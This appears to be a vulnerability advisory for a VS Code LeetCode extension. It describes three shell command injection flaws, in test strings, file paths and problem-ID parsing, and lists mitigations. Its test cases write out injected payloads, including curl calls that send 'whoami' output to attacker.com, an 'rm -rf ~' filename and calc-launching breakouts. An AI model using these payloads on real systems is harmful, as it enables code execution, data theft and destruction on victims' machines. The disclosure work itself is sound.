# Vulnerabilities in VS Code LeetCode Extension

## Command Injection in Test Functionality

### Description
This vulnerability allows remote code execution (RCE) via command injection through malicious test cases. When a user runs a test case, the test string is inadequately sanitized before being passed to `executeCommand`. 

Steps to trigger:
1. Create a malicious LeetCode repository with a carefully crafted test case
2. Convince a victim to open this repository in VS Code with the LeetCode extension installed
3. When the victim tests a solution using the malicious test case, the injected commands will execute on their machine

### Impact
Critical impact. An attacker can execute arbitrary commands with the privileges of the VS Code user, potentially leading to full system compromise, data theft, or further exploitation.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The code attempts to wrap test strings in quotes based on the operating system:
```typescript
// From src/commands/test.ts
function parseTestString(test: string): string {
    if (wsl.useWsl() || !isWindows()) {
        return `'${test}'`;
    }
    // In windows and not using WSL
    if (usingCmd()) {
        return `"${test.replace(/"/g, '\\"')}"`;
    } else {
        // Assume using PowerShell
        return `'${test.replace(/"/g, '\\"')}'`;
    }
}
```
However, this is insufficient as the quotes can be escaped or broken out of.

### Missing Mitigations
- Input validation to reject test cases containing dangerous characters
- Use of a safer API than direct command execution
- Use of proper command argument passing instead of string concatenation

### Preconditions
- The victim must have the VS Code LeetCode extension installed
- The victim must open a malicious LeetCode repository
- The victim must run a test using the malicious test case

### Source Code Analysis
The vulnerability lies in the command execution flow. Let's trace it:

1. In `src/commands/test.ts`, when a user inputs a test case, it's processed by `parseTestString()` which attempts to wrap it in quotes
2. This test string is then passed to `leetCodeExecutor.testSolution()`
3. In `src/leetCodeExecutor.ts`, the `testSolution` method passes the string to `executeCommandWithProgressEx`:
```typescript
public async testSolution(filePath: string, testString?: string): Promise<string> {
    if (testString) {
        return await this.executeCommandWithProgressEx("Submitting to LeetCode...", this.nodeExecutable, [await this.getLeetCodeBinaryPath(), "test", `"${filePath}"`, "-t", `${testString}`]);
    }
    // ...
}
```
4. This eventually calls `executeCommand` in `src/utils/cpUtils.ts`:
```typescript
export async function executeCommand(command: string, args: string[], options: cp.SpawnOptions = { shell: true }): Promise<string> {
    // ...
    const childProc: cp.ChildProcess = cp.spawn(command, args, { ...options, env: createEnvOption() });
    // ...
}
```

The critical issue is that:
1. The `shell: true` option is used by default, making it vulnerable to shell metacharacters
2. On Unix-like systems (or WSL), a test string like `'||touch /tmp/pwned||'` could execute `touch /tmp/pwned`
3. Even with the quotes added by `parseTestString()`, a malicious string can break out of them

### Security Test Case
1. Set up a LeetCode repository with a problem file
2. Create a test case with the following content for Unix/Linux/WSL systems:
   ```
   '||curl -s http://attacker.com/$(whoami)||'
   ```
3. For Windows systems with PowerShell:
   ```
   '`; Start-Process calc.exe; `'
   ```
4. Convince a victim to open this repository in VS Code
5. When the victim runs the test case, the injected command will execute

## Command Injection in File Path Handling

### Description
This vulnerability allows arbitrary command execution by manipulating file paths that are passed to command execution functions. The extension directly incorporates file paths into shell commands without proper escaping.

Steps to trigger:
1. Create a malicious LeetCode repository with a crafted problem file that has a special filename
2. When the victim submits this solution, the path is passed to a shell command without proper sanitization

### Impact
Critical impact. An attacker can execute arbitrary commands with the privileges of the VS Code user, potentially leading to full system compromise, data theft, or further exploitation.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The code attempts to wrap file paths in quotes:
```typescript
// From src/leetCodeExecutor.ts
public async submitSolution(filePath: string): Promise<string> {
    try {
        return await this.executeCommandWithProgressEx("Submitting to LeetCode...", this.nodeExecutable, [await this.getLeetCodeBinaryPath(), "submit", `"${filePath}"`]);
    } catch (error) {
        if (error.result) {
            return error.result;
        }
        throw error;
    }
}
```
However, simple quoting is insufficient for properly sanitizing paths.

### Missing Mitigations
- Path sanitization to strip or escape shell metacharacters
- Validation of file paths to ensure they don't contain dangerous characters
- Use of safer APIs for file operations

### Preconditions
- The victim must have the VS Code LeetCode extension installed
- The victim must open a malicious LeetCode repository with a specially crafted filename
- The victim must submit or test the solution

### Source Code Analysis
The vulnerability exists in the way file paths are handled:

1. In various commands like `submitSolution`, file paths are directly incorporated into commands:
```typescript
// From src/leetCodeExecutor.ts
public async submitSolution(filePath: string): Promise<string> {
    try {
        return await this.executeCommandWithProgressEx("Submitting to LeetCode...", this.nodeExecutable, [await this.getLeetCodeBinaryPath(), "submit", `"${filePath}"`]);
    } catch (error) {
        if (error.result) {
            return error.result;
        }
        throw error;
    }
}
```

2. These commands are eventually executed via `executeCommand` in `src/utils/cpUtils.ts`:
```typescript
export async function executeCommand(command: string, args: string[], options: cp.SpawnOptions = { shell: true }): Promise<string> {
    // ...
    const childProc: cp.ChildProcess = cp.spawn(command, args, { ...options, env: createEnvOption() });
    // ...
}
```

The key issue is that:
1. The file path is wrapped in quotes but not properly escaped
2. With `shell: true`, shell metacharacters in the path could break out of the quotes and inject commands
3. A filename like `test";rm -rf ~;"` would be interpreted as multiple commands

### Security Test Case
1. Create a LeetCode repository with a problem file that has a malicious filename:
   - For Unix/Linux/WSL: `solution";curl -s http://attacker.com/$(whoami);".js`
   - For Windows: `solution";start calc;".js`
2. Convince a victim to open this repository in VS Code
3. When the victim submits or tests this solution, the injected command will execute

## Command Injection via Problem Identifier Parsing

### Description
The extension extracts a problem's identifier by reading a problem file's contents (or by falling back to the file name) using a loose regular expression. An attacker who supplies a manipulated repository can craft a problem file whose comment line (or even its file name) embeds shell metacharacters and extra commands. When the victim later triggers the "Show Problem" command, the extension passes the unsanitized problem identifier as an argument to an external command (via the "leetcode" CLI) that is executed with a shell. As a result, any injected shell commands will be interpreted and executed on the victim's machine.  

Step by step how an attacker can trigger this vulnerability:  
1. The attacker creates (or modifies) a problem file inside a repository distributed to the victim. In the file, the attacker inserts a specially crafted comment that adheres to the expected pattern while including unwanted shell metacharacters. For example, the file might include:  
   ```
   // @lc code=start id=123; touch /tmp/owned # 
   ```  
   Alternatively, if no comment exists, the extension falls back to using the file name—so a file can be named:  
   ```
   123; touch /tmp/owned.js
   ```  
2. The victim opens the malicious repository in VS Code. The extension then attempts to later identify the problem by reading the file. It uses the regular expression `/@lc.+id=(.+?) /` (or, if no match is found, the file's base name) to capture the problem ID.
3. Because the attacker's crafted comment (or file name) includes a payload (for instance, "123; touch /tmp/owned"), the extension extracts this entire string as the problem identifier.
4. The extension's function that shows the problem — in particular, `showProblem()` in the `leetCodeExecutor` module — constructs a command array that includes the unsanitized problem identifier. It then calls a helper (which in turn calls Node's `child_process.spawn` with the `shell: true` option) to run a CLI command such as:  
   ```
   [ "node", "/path/to/vsc-leetcode-cli/bin/leetcode", "show", "123; touch /tmp/owned", "-c", "-l", "javascript" ]
   ```  
5. With the shell enabled and no proper escaping applied, the injected "; touch /tmp/owned" is interpreted by the shell as an additional command, resulting in the attacker's payload being executed on the victim's machine.

### Impact
An attacker can achieve arbitrary command execution (remote code execution) within the context of the victim's VS Code environment. This may allow the attacker to take complete control of the host system or perform further malicious actions.

### Vulnerability Rank
High

### Currently Implemented Mitigations
• The extension does wrap some file paths in quotes (e.g. `"${filePath}"`), but the key identifier value (derived from file content or file name) is not explicitly sanitized or escaped before being passed to a shell.  
• There is no check or transformation on the captured problem identifier to remove shell metacharacters.

### Missing Mitigations
• Proper input validation and sanitization on the problem identifier extracted from file contents.  
• Use of safe child process APIs (for example, setting `shell: false` or using libraries that avoid command–line concatenation) or explicit escaping/whitelisting of allowed characters.  
• Validation of file names and contents to ensure they match an expected strict format for problem IDs (e.g. numbers only).

### Preconditions
• The victim must open a repository (or workspace) that contains a problem file whose content or file name has been manipulated.  
• The malicious file must include a specially crafted comment (or have a malicious name) that the extension uses to extract the problem ID.  
• The victim then triggers a command (e.g. "Show Problem") that causes the extension to run the affected function.

### Source Code Analysis
1. **Extraction of Identifier:**  
   In `/code/src/utils/problemUtils.ts`, the function `getNodeIdFromFile` reads the file's content and applies the regex  
   ```
   /@lc.+id=(.+?) /
   ```  
   to capture the problem ID. If no match is found it uses the file's base name (splitting on "."). Neither path performs any sanitization to remove or escape shell metacharacters.

2. **Usage in Command Execution:**  
   In `/code/src/leetCodeExecutor.ts`, the `showProblem` method builds a command array that includes the unsanitized `problemNode.id` along with other parameters (such as template type and language):  
   ```
   const cmd: string[] = [await this.getLeetCodeBinaryPath(), "show", problemNode.id, templateType, "-l", language];
   ```  
   This array is passed to `executeCommandWithProgressEx()`, which in turn ends up calling `executeCommand()` where Node's `child_process.spawn` is invoked with the option `{ shell: true }`.

3. **Risk from Unsanitized Input:**  
   Using `shell: true` means that if the captured problem ID contains shell metacharacters (for example, a semicolon `;`), the full command string can be modified so that additional unintended commands (such as `touch /tmp/owned`) are executed by the shell.

### Security Test Case
1. **Setup a Malicious File:**  
   • Create a file (e.g., `malicious.js`) with the following content:  
     ```js
     // @lc code=start id=123; touch /tmp/owned #
     // Some sample code
     ```  
   • Alternatively, rename a file to something like:  
     ```
     123; touch /tmp/owned.js
     ```  
2. **Open in VS Code:**  
   • Open the malicious repository (or workspace) in VS Code so that the file is visible to the extension.
3. **Trigger the Vulnerable Function:**  
   • In VS Code, trigger the "Show Problem" command (either via the context menu or Code Lens) for the problem corresponding to the malicious file.
4. **Observe the Outcome:**  
   • Check whether the shell command injection was successful (for example, verify that the file `/tmp/owned` has been created as a result of the injected command).
5. **Confirmation:**  
   • If the file is present, this confirms that the unsanitized problem identifier allowed arbitrary shell command execution.